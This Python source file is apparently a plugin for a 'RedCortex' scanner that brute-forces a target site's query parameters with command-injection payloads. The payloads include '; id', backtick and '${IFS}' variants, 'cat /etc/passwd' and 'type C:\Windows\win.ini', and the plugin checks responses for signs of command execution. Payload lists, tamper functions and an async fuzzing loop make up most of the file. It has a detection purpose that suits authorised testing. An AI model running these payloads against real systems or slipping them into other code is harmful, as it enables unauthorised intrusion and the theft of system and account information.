"""
RedCortex Plugin: Advanced Remote Command Execution Detector
- Async brute param/payload/tamper mass fuzzing (httpx)
- Multiple OS/platform detection signatures (POSIX, Windows, Mac, boot.ini, uname -a)
- Encoding/tamper variations: null byte, space mutations, IFS, backticks, chaining/separators
- Direct output and error-based detection (id/whoami/GOLDMINE, echo, system/user info)
- Severity ranking, context reporting, ready for bulk/automation workflows
"""

import asyncio
import httpx
import random
import re

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
]
RCE_PARAMS = [
    "cmd", "exec", "command", "run", "query", "process",
    "function", "shell", "ping", "url", "host", "ip"
]
RCE_PAYLOADS = [
    "id",
    "whoami",
    "uname -a",
    "cat /etc/passwd",
    "echo REDCORTEX123",
    "type C:\\Windows\\win.ini",
    "ls /",
    "; id",
    "| id",
    "`id`",
    "|| whoami",
    "';id;'",
    "'|id'",
    ";echo REDCORTEX456",
    "|echo REDCORTEX456"
]
TAME_ENCODINGS = [
    lambda x: x,
    lambda x: x + "%0a",
    lambda x: x.replace("id", "whoami"),
    lambda x: x.replace("id", "id;echo-7777"),
    lambda x: x.replace(" ", "${IFS}"),
    lambda x: x.replace("id", "`id`"),
    lambda x: x.replace("id", "id\\;"),
]
RCE_PATTERNS = [
    r"uid=\d+",                 # POSIX id output
    r"gid=\d+",
    r"REDCORTEX123",            # proof echo
    r"REDCORTEX456",
    r"root:.*:0:0:",            # /etc/passwd output
    r"Microsoft Windows",       # Win ini/OS output
    r"\[extensions\]",          # win.ini evidence
    r"Linux",                   # uname OS
    r"Darwin",                  # macOS
    r"No such file or directory", # error
]

async def scan_rce(client, url, param, payload):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    params = {param: payload}
    try:
        resp = await client.get(url, params=params, headers=headers, timeout=12)
        code, body = resp.status_code, resp.text
        findings = []
        for pat in RCE_PATTERNS:
            if re.search(pat, body, re.IGNORECASE):
                findings.append({
                    "type": "RCE",
                    "param": param,
                    "payload": payload,
                    "evidence": pat,
                    "http_code": code,
                    "severity": "critical",
                    "url": str(resp.url),
                    "proof_excerpt": body[:100]
                })
        # Less strict: raw UNIX/whoami presence
        if any(kw in body for kw in ["uid=", "whoami", "root:", "Linux"]):
            findings.append({
                "type": "Possible RCE",
                "param": param,
                "payload": payload,
                "evidence": "Raw OS outputleak",
                "http_code": code,
                "severity": "high",
                "url": str(resp.url),
                "proof_excerpt": body[:100]
            })
        return findings
    except Exception:
        return []

async def advanced_rce_scan(url):
    findings = []
    concurrency = 7
    async with httpx.AsyncClient(follow_redirects=True, verify=False) as client:
        tasks = []
        for param_name in RCE_PARAMS:
            for tamper in TAME_ENCODINGS:
                for payload in RCE_PAYLOADS:
                    tasks.append(scan_rce(client, url, param_name, tamper(payload)))
                if len(tasks) >= concurrency:
                    results = await asyncio.gather(*tasks)
                    for result in results:
                        findings.extend(result or [])
                    tasks = []
        if tasks:
            results = await asyncio.gather(*tasks)
            for result in results:
                findings.extend(result or [])
    return findings

def run(response, url, **kwargs):
    """
    RedCortex plugin interface; runs async brute param/payload/tamper scan,
    detects critical command exec evidence, and returns full JSON.
    """
    try:
        return asyncio.run(advanced_rce_scan(url))
    except KeyboardInterrupt:
        return []

# Example usage
# findings = run(None, "https://vulnerable.site/page")
# for finding in findings: print(finding)
